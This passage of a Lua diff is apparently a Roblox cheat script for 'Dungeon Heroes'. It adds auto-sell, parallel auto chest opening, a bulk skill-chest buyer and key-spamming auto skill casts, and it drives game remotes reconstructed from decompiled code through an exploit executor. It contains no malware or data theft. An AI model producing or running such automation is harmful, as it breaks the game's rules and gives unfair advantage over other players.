+local function GetGroupKey(Entry)
+
+local BaseKey =  
+    tostring(Entry.ID)  
+    .. "|" .. tostring(Entry.Rarity)  
+
+-- FIXED TITLE GROUPING  
+if Entry.IsTitle then  
+    return BaseKey .. "|TITLE"  
+end  
+
+if Entry.Data.Category == "Skill" then  
+
+    return BaseKey  
+        .. "|Skill|"  
+        .. tostring(Entry.SeasonalLevel)  
+end  
+
+if Entry.Data.Category == "Cosmetic" then  
+
+    return BaseKey  
+        .. "|"  
+        .. tostring(Entry.Type)  
+        .. "|"  
+        .. tostring(Entry.Dye)  
+end  
+
+return BaseKey
+
+end
+
+-- ==========================================
+-- NORMAL SELL
+-- ==========================================
+
+local function GetNormalSellList(Collected)
+
+local SellList = {}  
+
+for _, Entry in ipairs(Collected) do  
+
+    if not Entry.Protected then  
+        table.insert(SellList, Entry.Item)  
+    end  
+end  
+
+return SellList, {}
+
+end
+
+-- ==========================================
+-- DUPLICATE SELL
+-- ==========================================
+
+local function GetDuplicateSellList(Collected)
+
+local Groups = {}  
+
+for _, Entry in ipairs(Collected) do  
+
+    local Key = GetGroupKey(Entry)  
+
+    Groups[Key] = Groups[Key] or {}  
+
+    table.insert(Groups[Key], Entry)  
+end  
+
+local SellList = {}  
+local MetaTable = {}  
+
+for _, Group in pairs(Groups) do  
+
+    local ProtectedEntries = {}  
+    local UnprotectedEntries = {}  
+
+    for _, Entry in ipairs(Group) do  
+
+        if Entry.Protected then  
+            table.insert(ProtectedEntries, Entry)  
+        else  
+            table.insert(UnprotectedEntries, Entry)  
+        end  
+    end  
+
+    local IsSkillGroup =  
+        Group[1].Data.Category == "Skill"  
+
+    if IsSkillGroup then  
+
+        local HighestProtectedLevel = -math.huge  
+
+        for _, Entry in ipairs(ProtectedEntries) do  
+
+            HighestProtectedLevel = math.max(  
+                HighestProtectedLevel,  
+                Entry.Level  
+            )  
+        end  
+
+        table.sort(  
+            UnprotectedEntries,  
+            function(a, b)  
+                return a.Level > b.Level  
+            end  
+        )  
+
+        local KeepOne = false  
+
+        for _, Entry in ipairs(UnprotectedEntries) do  
+
+            local ShouldKeep = false  
+
+            if not KeepOne  
+            and Entry.Level > HighestProtectedLevel then  
+
+                ShouldKeep = true  
+                KeepOne = true  
+            end  
+
+            if not ShouldKeep then  
+                table.insert(SellList, Entry.Item)  
+            end  
+        end  
+
+    else  
+
+        local ProtectedCopies = 0  
+
+        for _, Entry in ipairs(ProtectedEntries) do  
+            ProtectedCopies =  
+                ProtectedCopies + Entry.Count  
+        end  
+
+        local RemainingKeep = ProtectedCopies > 0 and 0 or 1  
+
+        for _, Entry in ipairs(UnprotectedEntries) do  
+
+            local KeepAmount = math.min(  
+                Entry.Count,  
+                RemainingKeep  
+            )  
+
+            RemainingKeep = RemainingKeep - KeepAmount  
+
+            local SellAmount = Entry.Count - KeepAmount  
+
+            if SellAmount > 0 then  
+
+                table.insert(SellList, Entry.Item)  
+
+                if SellAmount < Entry.Count then  
+
+                    table.insert(MetaTable, {  
+                        Entry.Item,  
+                        SellAmount  
+                    })  
+                end  
+            end  
+        end  
+    end  
+end  
+
+return SellList, MetaTable
+
+end
+
+-- ==========================================
+-- EXECUTION
+-- ==========================================
+
+local function RunAutoSell()
+
+if not AutoSellEnabled then  
+    return  
+end  
+
+local Collected = CollectItems()  
+
+if #Collected == 0 then  
+    return  
+end  
+
+local SellList  
+local MetaTable  
+
+if DuplicateSellEnabled  
+and SelectedCategory ~= "Gear" then  
+
+    SellList, MetaTable =  
+        GetDuplicateSellList(Collected)  
+
+else  
+
+    SellList, MetaTable =  
+        GetNormalSellList(Collected)  
+end  
+
+if #SellList == 0 then  
+    return  
+end  
+
+if os.clock() - LastSellTime < SellCooldown then  
+    return  
+end  
+
+LastSellTime = os.clock()  
+
+print(  
+    "[Auto Sell]",  
+    SelectedCategory,  
+    "Count:",  
+    #SellList,  
+    "Duplicate:",  
+    DuplicateSellEnabled  
+)  
+
+ItemSelling:SellItem(  
+    Player,  
+    SellList,  
+    MetaTable  
+)
+
+end
+
+-- ==========================================
+-- MAIN LOOP
+-- ==========================================
+
+task.spawn(function()
+
+while true do  
+
+    task.wait(ScanDelay)  
+
+    if AutoSellEnabled then  
+
+        local Success, Error = pcall(RunAutoSell)  
+
+        if not Success then  
+            warn("[Auto Sell Error]", Error)  
+        end  
+    end  
+end
+
+end)
+end
+
+ChestTab:CreateSection("Auto chest open")
+
+do
+-- Dungeon Heroes | Universal Parallel Auto Chest Opener (Exact Decompiled Logic)
+-- Supports: Pet Chest, Skill Chests, Banana/Event Chests, Basic Chest, Aura Chest, Title Chest, Mega Chest
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+local Player = Players.LocalPlayer
+local Inventory = nil
+
+local Remotes = ReplicatedStorage:WaitForChild("Remotes")
+local OpenPetChest = Remotes:WaitForChild("OpenPetChest")
+local OpenAuraChest = Remotes:WaitForChild("OpenAuraChest")
+local OpenMegaChest = Remotes:WaitForChild("OpenMegaChest")
+local OpenChest = Remotes:WaitForChild("OpenChest")
+
+local ChestShop = require(ReplicatedStorage:WaitForChild("Systems"):WaitForChild("ChestShop"))
+local ItemList = require(ReplicatedStorage:WaitForChild("WorldModules"):WaitForChild("Items"):WaitForChild("ItemList"))
+
+local BATCH_SIZE = 5
+local enabled = false
+local session = 0
+local Workers = {}
+local StackListeners = {}
+
+-- Exact Decompiled Category Detection (Current + Future Chests)
+local function GetChestType(item)
+	local countObj = item:FindFirstChild("Count")
+	if not countObj or not countObj:IsA("ValueBase") then
+		return nil
+	end
+
+	local uid = item:GetAttribute("ItemUid")
+	local data = ItemList[item.Name]
+
+	if type(data) == "table" then
+		local cat = data.Category
+
+		if cat == "Pet Chest" then
+			return "Pet", uid
+		elseif cat == "Chest" then
+			-- SkillChest, FrozenSkillChest, GoldenSkillChest, BananaFoodChest & all Event Chests
+			return "Standard", uid
+		elseif cat == "Basic Chest" or cat == "AuraChest" or cat == "TitleChest" then
+			return "Aura", uid
+		elseif cat == "MegaChest" then
+			return "Mega", uid
+		end
+
+		-- Future-proof check: agar future update mein naya chest category aaye jisme loot table ho
+		if cat ~= "Armor" and cat ~= "Weapon" and cat ~= "Cosmetic" and cat ~= "Food" and cat ~= "Potion" and cat ~= "Booster" then
+			if data.PossibleItems or data.PossibleItemsWithWeights or data.PossibleItemsIsGenerated then
+				return "Standard", uid
+			end
+		end
+
+		return nil
+	end
+
+	-- Fallback agar koi naya item ItemList mein na ho
+	local lowerName = item.Name:lower()
+	if not lowerName:find("chestplate") then
+		if lowerName:find("petchest") then
+			return "Pet", uid
+		elseif lowerName:find("megachest") then
+			return "Mega", uid
+		elseif lowerName:find("aurachest") or lowerName:find("titlechest") or lowerName:find("basic") then
+			return "Aura", uid
+		elseif lowerName:find("chest") then
+			return "Standard", uid
+		end
+	end
+
+	return nil
+end
+
+-- Start independent worker for each chest stack
+local function StartWorker(item, token)
+	if Workers[item] == token then
+		return
+	end
+
+	local chestType, uid = GetChestType(item)
+	if not chestType then
+		return
+	end
+
+	local countObj = item:FindFirstChild("Count")
+	if not countObj or not countObj:IsA("ValueBase") or countObj.Value <= 0 then
+		return
+	end
+
+	Workers[item] = token
+
+	task.spawn(function()
+		local failCount = 0
+
+		while enabled and session == token and item.Parent == Inventory and countObj.Parent do
+			local before = countObj.Value
+			if before <= 0 then
+				break
+			end
+
+			local amount = math.min(BATCH_SIZE, before)
+			local changed = false
+
+			-- Connect before sending request
+			local connection = countObj:GetPropertyChangedSignal("Value"):Connect(function()
+				if countObj.Value < before then
+					changed = true
+				end
+			end)
+
+			-- Send exact decompiled remote format
+			local success, err = pcall(function()
+				if chestType == "Pet" then
+					OpenPetChest:FireServer(item, amount)
+				elseif chestType == "Standard" then
+					-- Decompiled format: 3rd argument MUST be a table { uid }
+					if uid then
+						OpenChest:InvokeServer(item.Name, amount, { uid })
+					else
+						ChestShop:OpenChest(Player, item.Name, amount, { item })
+					end
+				elseif chestType == "Mega" then
+					OpenMegaChest:FireServer(uid or item, amount)
+				elseif chestType == "Aura" then
+					OpenAuraChest:FireServer(uid or item, amount)
+				end
+			end)
+
+			if not success then
+				connection:Disconnect()
+				warn("Chest error:", item.Name, err)
+				break
+			end
+
+			-- Wait for inventory count update
+			local startTime = os.clock()
+			while enabled and session == token and not changed and (os.clock() - startTime) < 3 do
+				if countObj.Value < before or not item.Parent then
+					changed = true
+					break
+				end
+				task.wait()
+			end
+
+			connection:Disconnect()
+
+			if not changed then
+				failCount += 1
+				if failCount >= 2 then
+					warn("No inventory update (Level locked or unsupported):", item.Name)
+					break
+				end
+				task.wait(0.2)
+			else
+				failCount = 0
+			end
+		end
+
+		if Workers[item] == token then
+			Workers[item] = nil
+		end
+	end)
+end
+
+-- Watch existing stack if more chests get added to the same stack later
+local function WatchStack(item)
+	if StackListeners[item] then
+		return
+	end
+
+	task.spawn(function()
+		local countObj = item:FindFirstChild("Count") or item:WaitForChild("Count", 2)
+		if not countObj or not countObj:IsA("ValueBase") then
+			return
+		end
+
+		if not GetChestType(item) then
+			return
+		end
+
+		StackListeners[item] = countObj:GetPropertyChangedSignal("Value"):Connect(function()
+			if enabled and countObj.Value > 0 and Workers[item] ~= session then
+				StartWorker(item, session)
+			end
+		end)
+
+		item.AncestryChanged:Connect(function(_, parent)
+			if not parent and StackListeners[item] then
+				StackListeners[item]:Disconnect()
+				StackListeners[item] = nil
+			end
+		end)
+	end)
+end
+
+-- Scan every chest stack in Inventory
+local function ScanInventory(token)
+	if not Inventory then
+		return
+	end
+
+	for _, item in ipairs(Inventory:GetChildren()) do
+		if not enabled or session ~= token then
+			break
+		end
+		WatchStack(item)
+		StartWorker(item, token)
+	end
+end
+
+-- Detect Inventory & newly added chests in background
+task.spawn(function()
+	local PlayerGui = Player:WaitForChild("PlayerGui")
+	local Profile = PlayerGui:WaitForChild("Profile")
+	Inventory = Profile:WaitForChild("Inventory")
+
+	Inventory.ChildAdded:Connect(function(item)
+		WatchStack(item)
+		if enabled then
+			local token = session
+			task.defer(function()
+				if not item:FindFirstChild("Count") then
+					item:WaitForChild("Count", 2)
+				end
+				if enabled and session == token then
+					StartWorker(item, token)
+				end
+			end)
+		end
+	end)
+
+	for _, item in ipairs(Inventory:GetChildren()) do
+		WatchStack(item)
+	end
+
+	if enabled then
+		ScanInventory(session)
+	end
+end)
+
+-- Main toggle
+ChestTab:CreateToggle({
+	Name = "Auto Open All Chests",
+	CurrentValue = false,
+    Flag = "AutoOpenAllChests",
+	Callback = function(value)
+		enabled = value
+		session += 1
+
+		if enabled then
+			local token = session
+			ScanInventory(token)
+		end
+	end
+})
+end
+
+ChestTab:CreateSection("Auto Buy Skill Chest")
+
+do
+
+-- ============================================================================
+-- DUNGEON HEROES | SMART REMOTE SKILL CHEST BUYER (15 DUNGEONS + ELITE CHESTS)
+-- ============================================================================
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local TweenService = game:GetService("TweenService")
+local CoreGui = game:GetService("CoreGui")
+
+local LocalPlayer = Players.LocalPlayer
+local Systems = ReplicatedStorage:WaitForChild("Systems")
+local ChestShop = require(Systems:WaitForChild("ChestShop"))
+local DungeonsSys = require(Systems:WaitForChild("Dungeons"))
+local ItemList = require(ReplicatedStorage:WaitForChild("WorldModules"):WaitForChild("Items"):WaitForChild("ItemList"))
+local OpenChestRemote = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("OpenChest")
+
+-- ============================================================================
+-- 1. CUSTOM 3-SECOND TOP UI NOTIFICATION SYSTEM (NON-RAYFIELD)
+-- ============================================================================
+local ActiveNotifGui = nil
+local ActiveNotifToken = 0
+
+local function ShowTopNotification(titleText, bodyText, isError)
+	ActiveNotifToken += 1
+	local currentToken = ActiveNotifToken
+
+	if ActiveNotifGui and ActiveNotifGui.Parent then
+		ActiveNotifGui:Destroy()
+	end
+
+	local parentGui = (gethui and gethui()) or LocalPlayer:FindFirstChildOfClass("PlayerGui") or CoreGui
+	local screenGui = Instance.new("ScreenGui")
+	screenGui.Name = "DH_SkillShopNotifier"
+	screenGui.ResetOnSpawn = false
+	screenGui.DisplayOrder = 999999
+	screenGui.IgnoreGuiInset = true
+	pcall(function()
+		screenGui.Parent = CoreGui
+	end)
+	if not screenGui.Parent then
+		screenGui.Parent = parentGui
+	end
+	ActiveNotifGui = screenGui
+
+	local mainFrame = Instance.new("Frame")
+	mainFrame.Name = "Banner"
+	mainFrame.AnchorPoint = Vector2.new(0.5, 0)
+	mainFrame.Position = UDim2.new(0.5, 0, 0, -90)
+	mainFrame.Size = UDim2.new(0, 440, 0, 68)
+	mainFrame.BackgroundColor3 = Color3.fromRGB(20, 22, 28)
+	mainFrame.BorderSizePixel = 0
+	mainFrame.Parent = screenGui
+
+	local corner = Instance.new("UICorner")
+	corner.CornerRadius = UDim.new(0, 10)
+	corner.Parent = mainFrame
+
+	local stroke = Instance.new("UIStroke")
+	stroke.Thickness = 2
+	stroke.Color = isError and Color3.fromRGB(255, 75, 75) or Color3.fromRGB(60, 220, 130)
+	stroke.Parent = mainFrame
+
+	local titleLabel = Instance.new("TextLabel")
+	titleLabel.BackgroundTransparency = 1
+	titleLabel.Position = UDim2.new(0, 14, 0, 8)
+	titleLabel.Size = UDim2.new(1, -28, 0, 22)
+	titleLabel.Font = Enum.Font.GothamBold
+	titleLabel.TextSize = 15
+	titleLabel.TextXAlignment = Enum.TextXAlignment.Left
+	titleLabel.TextColor3 = isError and Color3.fromRGB(255, 95, 95) or Color3.fromRGB(80, 240, 150)
+	titleLabel.Text = titleText
+	titleLabel.Parent = mainFrame
+
+	local bodyLabel = Instance.new("TextLabel")
+	bodyLabel.BackgroundTransparency = 1
+	bodyLabel.Position = UDim2.new(0, 14, 0, 30)
+	bodyLabel.Size = UDim2.new(1, -28, 0, 32)
+	bodyLabel.Font = Enum.Font.GothamMedium
+	bodyLabel.TextSize = 13
+	bodyLabel.TextWrapped = true
+	bodyLabel.TextXAlignment = Enum.TextXAlignment.Left
+	bodyLabel.TextYAlignment = Enum.TextYAlignment.Top
+	bodyLabel.TextColor3 = Color3.fromRGB(235, 235, 240)
+	bodyLabel.Text = bodyText
+	bodyLabel.Parent = mainFrame
+
+	-- Slide Down Animation
+	TweenService:Create(
+		mainFrame,
+		TweenInfo.new(0.25, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
+		{ Position = UDim2.new(0.5, 0, 0, 18) }
+	):Play()
+
+	-- Auto Disappear in 3 Seconds
+	task.delay(3, function()
+		if ActiveNotifToken ~= currentToken or not screenGui.Parent then
+			return
+		end
+		local outTween = TweenService:Create(
+			mainFrame,
+			TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.In),
+			{ Position = UDim2.new(0.5, 0, 0, -90) }
+		)
+		outTween:Play()
+		outTween.Completed:Wait()
+		if screenGui.Parent then
+			screenGui:Destroy()
+		end
+	end)
+end
+
+local function FormatNumber(n)
+	local formatted = tostring(math.floor(tonumber(n) or 0))
+	while true do
+		local k
+		formatted, k = string.gsub(formatted, "^(-?%d+)(%d%d%d)", "%1,%2")
+		if k == 0 then break end
+	end
+	return formatted
+end
+
+-- ============================================================================
+-- 2. HELPER FUNCTIONS FOR CURRENCIES, INVENTORY & CHEST PRICES
+-- ============================================================================
+local function GetProfile()
+	local pGui = LocalPlayer:FindFirstChild("PlayerGui")
+	return pGui and pGui:FindFirstChild("Profile")
+end
+
+local function GetPlayerLevel()
+	local profile = GetProfile()
+	local lvlObj = profile and profile:FindFirstChild("Level")
+	return (lvlObj and tonumber(lvlObj.Value)) or 1
+end
+
+local function GetPlayerKeys()
+	local profile = GetProfile()
+	local currencies = profile and profile:FindFirstChild("Currencies")
+	local keysObj = currencies and currencies:FindFirstChild("Keys")
+	return (keysObj and tonumber(keysObj.Value)) or 0
+end
+
+local function GetInventoryItemCount(itemName)
+	if not itemName then return 0 end
+	local profile = GetProfile()
+	local inv = profile and profile:FindFirstChild("Inventory")
+	if not inv then return 0 end
+
+	local total = 0
+	for _, item in ipairs(inv:GetChildren()) do
+		if item.Name == itemName then
+			local countObj = item:FindFirstChild("Count")
+			total += (countObj and tonumber(countObj.Value)) or 1
+		end
+	end
+	return total
+end
+
+local function GetDynamicChestCosts(chestId, rawData)
+	local playerLvl = GetPlayerLevel()
+	local resolvedData = rawData
+
+	-- Check level-scaled chest data from ChestShop
+	if type(ChestShop.GetChestDataForLevel) == "function" then
+		local ok, res = pcall(function()
+			return ChestShop:GetChestDataForLevel(chestId, playerLvl)
+		end)
+		if (not ok or type(res) ~= "table") then
+			ok, res = pcall(function()
+				return ChestShop:GetChestDataForLevel(rawData, playerLvl)
+			end)
+		end
+		if ok and type(res) == "table" then
+			resolvedData = res
+		end
+	end
+
+	local keyPrice = tonumber(resolvedData.Price) or tonumber(rawData.Price)
+
+	if not keyPrice and type(ChestShop.GetChestPriceForLevel) == "function" then
+		local ok, p = pcall(function()
+			return ChestShop:GetChestPriceForLevel(chestId, playerLvl)
+		end)
+		if ok and type(p) == "number" then
+			keyPrice = p
+		end
+	end
+
+	local eliteKeyItem = resolvedData.EliteKeyItem or rawData.EliteKeyItem
+	local eliteKeyPrice = tonumber(resolvedData.EliteKeyPrice) or tonumber(rawData.EliteKeyPrice) or (eliteKeyItem and 1 or 0)
+
+	if eliteKeyItem and not keyPrice then
+		if type(ChestShop.GetEliteChestKeysPrice) == "function" then
+			local ok, ep = pcall(function()
+				return ChestShop:GetEliteChestKeysPrice(resolvedData)
+			end)
+			if ok and type(ep) == "number" then
+				keyPrice = ep
+			end
+		end
+		keyPrice = keyPrice or 20000 -- Default Elite Skill Chest Key cost
+	end
+
+	return keyPrice or 0, eliteKeyItem, eliteKeyPrice
+end
+
+-- ============================================================================
+-- 3. SCAN & SORT ALL 15 DUNGEON SKILL CHESTS (1ST TO 15TH LINE-WISE)
+-- ============================================================================
+local DUNGEON_PROGRESSION = {
+	["ForestDungeon"]          = { Order = 1,  Name = "Forest Dungeon" },
+	["MountainDungeon"]        = { Order = 2,  Name = "Mountain Dungeon" },
+	["CoveDungeon"]            = { Order = 3,  Name = "Deadman's Cove" },
+	["PirateDungeon"]          = { Order = 3,  Name = "Deadman's Cove" },
+	["CastleDungeon"]          = { Order = 4,  Name = "Castle Dungeon" },
+	["JungleDungeon"]          = { Order = 5,  Name = "Jungle Dungeon" },
+	["AstralDungeon"]          = { Order = 6,  Name = "Astral Abyss" },
+	["DesertDungeon"]          = { Order = 7,  Name = "Desert Dungeon" },
+	["CaveDungeon"]            = { Order = 8,  Name = "Cave Dungeon" },
+	["MushroomDungeon"]        = { Order = 9,  Name = "Mushroom Forest" },
+	["GoldDungeon"]            = { Order = 10, Name = "Golden Realm" },
+	["TwilightForestDungeon"]  = { Order = 11, Name = "Twilight Grove" },
+	["CathedralDungeon"]       = { Order = 12, Name = "Cathedral Dungeon" },
+	["OceanDungeon"]           = { Order = 13, Name = "Sunken (Ocean)" },
+	["EnchantedForestDungeon"] = { Order = 14, Name = "Sylvan Glade" },
+	["FrostDungeon"]           = { Order = 15, Name = "Frostheim Reach" }
+}
+
+local SkillChestList = {}
+local DropdownOptionToChest = {}
+local DropdownOptions = {}
+
+local function BuildOrderedSkillChestList()
+	table.clear(SkillChestList)
+	table.clear(DropdownOptionToChest)
+	table.clear(DropdownOptions)
+
+	for itemId, data in pairs(ItemList) do
+		if type(data) == "table"
+			and data.Category == "Chest"
+			and data.Type == "Skills"
+			and not data.Disabled
+			and not data.InDevelopment
+			and not data.HideFromChestShop
+			and not string.find(string.lower(itemId), "gauntlet")
+		then
+			local dungeonId = data.Dungeon
+			local dInfo = dungeonId and DUNGEON_PROGRESSION[dungeonId]
+
+			local dData = nil
+			if dungeonId and type(DungeonsSys.GetDungeonData) == "function" then
+				local ok, res = pcall(function()
+					return DungeonsSys:GetDungeonData(dungeonId)
+				end)
+				if ok and type(res) == "table" then
+					dData = res
+				end
+			end
+
+			local reqLevel = (dData and tonumber(dData.RequiredLevel))
+				or (data.LevelRange and tonumber(data.LevelRange.Min))
+				or 1
+
+			local minRange = (data.LevelRange and tonumber(data.LevelRange.Min)) or reqLevel
+			local isElite = (data.EliteKeyItem ~= nil)
+
+			-- Exact progression priority (1 to 15)
+			local sortOrder = dInfo and dInfo.Order or nil
+			if not sortOrder then
+				if isElite then
+					local lowerName = string.lower(itemId .. " " .. tostring(data.DisplayName or "") .. " " .. tostring(dungeonId or ""))
+					if string.find(lowerName, "sunken") or string.find(lowerName, "ocean") or string.find(lowerName, "abyss") then
+						sortOrder = 13
+					elseif string.find(lowerName, "elderwood") or string.find(lowerName, "sylvan") or string.find(lowerName, "forest") then
+						sortOrder = 14
+					elseif string.find(lowerName, "frost") or string.find(lowerName, "rime") or string.find(lowerName, "frozen") then
+						sortOrder = 15
+					else
+						sortOrder = 16
+					end
+				else
+					sortOrder = 0 -- Sorted by minRange / Price below
+				end
+			end
+
+			local dungeonDisplayName = (dInfo and dInfo.Name)
+				or (dData and (dData.DisplayName or dData.Name))
+				or (dungeonId and string.gsub(dungeonId, "Dungeon", ""))
+				or ("Lvl " .. tostring(minRange) .. "+")
+
+			local chestDisplayName = data.DisplayName or itemId
+			local basePrice = tonumber(data.Price) or 0
+
+			table.insert(SkillChestList, {
+				Id = itemId,
+				Data = data,
+				ChestName = chestDisplayName,
+				DungeonName = dungeonDisplayName,
+				IsElite = isElite,
+				EliteKeyItem = data.EliteKeyItem,
+				ReqLevel = reqLevel,
+				MinRange = minRange,
+				BasePrice = basePrice,
+				SortOrder = sortOrder
+			})
+		end
+	end
+
+	-- Sort strictly from 1st Dungeon to 15th Dungeon
+	table.sort(SkillChestList, function(a, b)
+		if a.IsElite ~= b.IsElite then
+			return not a.IsElite -- Normal Dungeons (1-12) first, Elite Dungeons (13-15) last
+		end
+		if a.SortOrder ~= b.SortOrder and a.SortOrder > 0 and b.SortOrder > 0 then
+			return a.SortOrder < b.SortOrder
+		end
+		if a.MinRange ~= b.MinRange then
+			return a.MinRange < b.MinRange
+		end
+		if a.ReqLevel ~= b.ReqLevel then
+			return a.ReqLevel < b.ReqLevel
+		end
+		if a.BasePrice ~= b.BasePrice then
+			return a.BasePrice < b.BasePrice
+		end
+		return a.Id < b.Id
+	end)
+
+	for idx, entry in ipairs(SkillChestList) do
+		local label
+		if entry.IsElite then
+			local eliteKeyData = ItemList[entry.EliteKeyItem]
+			local eliteKeyName = (eliteKeyData and eliteKeyData.DisplayName) or entry.EliteKeyItem
+			label = string.format("#%d | %s - %s [ELITE: %s]", idx, entry.DungeonName, entry.ChestName, eliteKeyName)
+		else
+			label = string.format("#%d | %s (Lvl %d+) - %s", idx, entry.DungeonName, entry.MinRange, entry.ChestName)
+		end
+
+		entry.Label = label
+		DropdownOptionToChest[label] = entry
+		table.insert(DropdownOptions, label)
+	end
+end
+
+BuildOrderedSkillChestList()
+
+-- ============================================================================
+-- 4. BUY & OPEN EXECUTION ENGINE (BATCH SIZE x REPEAT COUNT)
+-- ============================================================================
+local SelectedChestEntry = SkillChestList[1]
+local BatchSize = 5       -- 1 baari mein kitne kholne hain (1 to 5)
+local RepeatTimes = 1     -- Kitni baar wo batch kholna hai
+local IsBuying = false
+local BuySession = 0
+
+local function VerifyCanBuyBatch(entry, amountToOpen)
+	if not entry then
+		ShowTopNotification("Skill Chest Error", "Pehle Dropdown se koi Dungeon Skill Chest select karo!", true)
+		return false
+	end
+
+	-- 1. Check Dungeon Level Requirement if applicable
+	local playerLvl = GetPlayerLevel()
+	if entry.Data.Dungeon then
+		local ok, dData = pcall(function()
+			return DungeonsSys:GetDungeonData(entry.Data.Dungeon)
+		end)
+		local reqLvl = (ok and dData and tonumber(dData.RequiredLevel)) or 0
+		if reqLvl > 0 and playerLvl < reqLvl then
+			ShowTopNotification(
+				"Level Locked: " .. entry.ChestName,
+				string.format("Tumhara Level %d hai, is chest ke liye Level %d chahiye!", playerLvl, reqLvl),
+				true
+			)
+			return false
+		end
+	end
+
+	-- 2. Check Normal Keys & Elite Key
+	local keyPricePerChest, eliteKeyItem, eliteKeyPerChest = GetDynamicChestCosts(entry.Id, entry.Data)
+	local neededKeys = keyPricePerChest * amountToOpen
+	local currentKeys = GetPlayerKeys()
+
+	local missingParts = {}
+
+	if neededKeys > 0 and currentKeys < neededKeys then
+		local shortKeys = neededKeys - currentKeys
+		table.insert(missingParts, string.format(
+			"%s Keys kam hain (Need: %s | Have: %s)",
+			FormatNumber(shortKeys), FormatNumber(neededKeys), FormatNumber(currentKeys)
+		))
+	end
+
+	if eliteKeyItem and eliteKeyPerChest > 0 then
+		local neededElite = eliteKeyPerChest * amountToOpen
+		local currentElite = GetInventoryItemCount(eliteKeyItem)
+		if currentElite < neededElite then
+			local shortElite = neededElite - currentElite
+			local eliteData = ItemList[eliteKeyItem]
+			local eliteDisplayName = (eliteData and eliteData.DisplayName) or eliteKeyItem
+			table.insert(missingParts, string.format(
+				"%dx %s kam hai (Need: %d | Have: %d)",
+				shortElite, eliteDisplayName, neededElite, currentElite
+			))
+		end
+	end
+
+	if #missingParts > 0 then
+		ShowTopNotification(
+			"Missing Items for " .. entry.ChestName,
+			table.concat(missingParts, "  |  "),
+			true
+		)
+		return false
+	end
+
+	return true
+end
+
+local function RunSkillChestBuyer(token)
+	local entry = SelectedChestEntry
+	if not entry then
+		IsBuying = false
+		ShowTopNotification("Skill Chest Error", "Koi Dungeon Skill Chest select nahi hai!", true)
+		return
+	end
+
+	local totalBatches = math.max(1, math.floor(RepeatTimes))
+	local perBatch = math.clamp(math.floor(BatchSize), 1, 5)
+	local totalOpened = 0
+
+	for batchIndex = 1, totalBatches do
+		if not IsBuying or BuySession ~= token then
+			break
+		end
+
+		-- Pre-check currencies & keys before every batch
+		if not VerifyCanBuyBatch(entry, perBatch) then
+			IsBuying = false
+			break
+		end
+
+		local keysBefore = GetPlayerKeys()
+		local eliteBefore = entry.EliteKeyItem and GetInventoryItemCount(entry.EliteKeyItem) or 0
+
+		local ok, result = pcall(function()
+			-- ChestShop:OpenChest with 4th arg nil buys directly from shop & materializes skills
+			if type(ChestShop.OpenChest) == "function" then
+				return ChestShop:OpenChest(LocalPlayer, entry.Id, perBatch)
+			else
+				return OpenChestRemote:InvokeServer(entry.Id, perBatch)
+			end
+		end)
+
+		local keysAfter = GetPlayerKeys()
+		local eliteAfter = entry.EliteKeyItem and GetInventoryItemCount(entry.EliteKeyItem) or 0
+		local currencySpent = (keysAfter < keysBefore) or (eliteAfter < eliteBefore)
+		local gotItems = (type(result) == "table" and #result > 0)
+
+		if not ok or (not gotItems and not currencySpent) then
+			-- Re-verify if currency ran out or server rejected
+			if VerifyCanBuyBatch(entry, perBatch) then
+				ShowTopNotification(
+					"Purchase Blocked: " .. entry.ChestName,
+					"Server ne chest open nahi ki (Level requirement ya Inventory full check karo).",
+					true
+				)
+			end
+			IsBuying = false
+			break
+		end
+
+		totalOpened += perBatch
+
+		if batchIndex < totalBatches then
+			task.wait(0.15)
+		end
+	end
+
+	if totalOpened > 0 and BuySession == token then
+		ShowTopNotification(
+			"Skill Chests Opened!",
+			string.format("Successfully opened %dx %s (%s)!", totalOpened, entry.ChestName, entry.DungeonName),
+			false
+		)
+	end
+
+	if BuySession == token then
+		IsBuying = false
+	end
+end
+
+-- ============================================================================
+-- 5. RAYFIELD UI CONTROLS (DROPDOWN, SLIDERS, BUTTON / TOGGLE)
+-- ============================================================================
+ChestTab:CreateSection("Dungeon Skill Shop (Remote Buyer)")
+
+	ChestTab:CreateDropdown({
+		Name = "Select Dungeon Skill Chest (1 to 15)",
+		Options = DropdownOptions,
+		CurrentOption = DropdownOptions[1] and { DropdownOptions[1] } or {},
+		MultipleOptions = false,
+		Flag = "DungeonSkillChestDropdown",
+		Callback = function(Option)
+			local chosen = type(Option) == "table" and Option[1] or Option
+			if chosen and DropdownOptionToChest[chosen] then
+				SelectedChestEntry = DropdownOptionToChest[chosen]
+			end
+		end
+	})
+
+	ChestTab:CreateSlider({
+		Name = "Chests Per Batch (1 Baari Me Kitna Kholna Hai)",
+		Range = {1, 5},
+		Increment = 1,
+		Suffix = "Chests",
+		CurrentValue = 5,
+		Flag = "SkillChestBatchSize",
+		Callback = function(Value)
+			BatchSize = Value
+		end
+	})
+
+	ChestTab:CreateSlider({
+		Name = "Repeat Times (Kitni Baar Kholna Hai)",
+		Range = {1, 100},
+		Increment = 1,
+		Suffix = "Times",
+		CurrentValue = 1,
+		Flag = "SkillChestRepeatTimes",
+		Callback = function(Value)
+			RepeatTimes = Value
+		end
+	})
+
+	ChestTab:CreateButton({
+		Name = "Buy & Open Selected Skill Chest",
+		Callback = function()
+			if IsBuying then
+				-- Agar pehle se chal raha hai toh dobara click karne pe stop kar dega
+				IsBuying = false
+				BuySession += 1
+				ShowTopNotification("Stopped", "Skill Chest opening रोक di gayi hai.", true)
+				return
+			end
+
+			IsBuying = true
+			BuySession += 1
+			local token = BuySession
+			task.spawn(function()
+				RunSkillChestBuyer(token)
+			end)
+		end
+	})
+end
+
+UtilityTab:CreateSection("Auto Skill Cast")
+
+local VirtualInputManager =
+game:GetService("VirtualInputManager")
+
+local AutoSkillEnabled = false
+local SkillRunId = 0
+
+-- Configuration
+local KEYS = {
+Enum.KeyCode.E,
+Enum.KeyCode.R,
+Enum.KeyCode.F,
+Enum.KeyCode.X,
+Enum.KeyCode.C
+}
+
+local HoldTime = 0.05
+local Delay = 0.1
+
+-- Auto Skill Function
+local function StartSkillSpam()
+SkillRunId += 1
+local CurrentRun = SkillRunId
+
+AutoSkillEnabled = true  
+
+task.spawn(function()  
+    while AutoSkillEnabled and SkillRunId == CurrentRun do  
+
+        for _, Key in ipairs(KEYS) do  
+
+            if not AutoSkillEnabled  
